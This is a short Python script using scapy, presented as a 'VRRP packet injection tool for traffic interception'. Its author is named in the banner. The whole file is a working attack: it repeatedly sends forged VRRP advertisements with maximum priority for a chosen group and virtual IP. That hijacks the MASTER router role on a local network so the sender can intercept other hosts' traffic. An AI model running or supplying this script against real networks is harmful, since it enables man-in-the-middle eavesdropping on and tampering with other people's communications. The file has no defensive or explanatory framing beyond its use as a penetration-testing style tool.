#!/usr/bin/env python3


from scapy.all import *
from scapy.layers.l2 import *
from scapy.layers.vrrp import *
import argparse



print (r"""
МММММММММММ ММММММММММММ ММММММММММММ ММММММММММММ МММММММММММММММ ММММММММММ
M  MMMMM  M MM  mmmm,  M MM  mmmm,  M MM  mmmmm  M M  MMM  MMM  M M  mmmm.  M 
M  MMMMP  M M'        .M M'        .M M'        .M M  MMP  MMP  M M  MMMMM  M 
M  MMMM' .M MM  MMMb. "M MM  MMMb. "M MM  MMMMMMMM M  MM'  MM' .M M  MMMMM  M 
M  MMP' .MM MM  MMMMM  M MM  MMMMM  M MM  MMMMMMMM M  `' . '' .MM M  MMMMM  M 
M     .dMMM MM  MMMMM  M MM  MMMMM  M MM  MMMMMMMM M    .d  .dMMM M  MMMMM  M 
MMMMMMMMMMM MMMMMMMMMMMM MMMMMMMMMMMM MMMMMMMMMMMM MMMMMMMMMMMMMM MMMMMMMMMMM  
    """)
print ("VRRP packet injection tool for traffic interception")
print("\nAuthor: necreas1ng, <necreas1ng@protonmail.com>\n")

VRRPMulticastAddr = "224.0.0.18"

def take_arguments():
    parser = argparse.ArgumentParser()
    parser.add_argument("--interface", dest="interface", type=str, required=True, help="Select your network interface")
    parser.add_argument("--group", dest="group", type=int, required=True, help="Choose VRRP group ID value")
    parser.add_argument("--ip", dest="attackerip", type=str, required=True, help="Specify your IP address")
    parser.add_argument("--vip", dest="vip", type=str, required=True, help="Specify VRRP Virtual IP address")

    args = parser.parse_args()

    return args




def inject(interface, group, attackerip, vip):
    L2frame = Ether()
    L3packet = IP(src=args.attackerip, dst=VRRPMulticastAddr, ttl=255)
    evil_vrrp = VRRP(vrid=args.group, priority=255, addrlist=args.vip)
    crafted = L2frame / L3packet / evil_vrrp
    print ("\n[+] We begin to intercept the role of the MASTER router...")
    sendp(crafted, iface=args.interface, inter=3, loop=1, verbose=1)

args = take_arguments()
inject(args.interface, args.group, args.attackerip, args.vip)




